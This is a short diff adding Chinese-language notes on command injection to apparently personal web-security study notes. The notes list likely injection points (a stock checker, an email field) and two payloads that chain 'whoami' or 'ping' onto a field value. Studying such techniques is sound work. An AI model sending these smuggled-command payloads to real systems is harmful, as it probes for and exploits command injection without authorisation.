@@ -92,6 +92,13 @@ Use the following payload to retrieve the list of tables in the database:(For No
 6. SSRF
 
 7. Command injection
+常见注入点:
+a. product stock checker
+b. email
+
+常用payload:
+1|whoami
+email=x||ping+-c+10+127.0.0.1||
 
 8. File upload
 
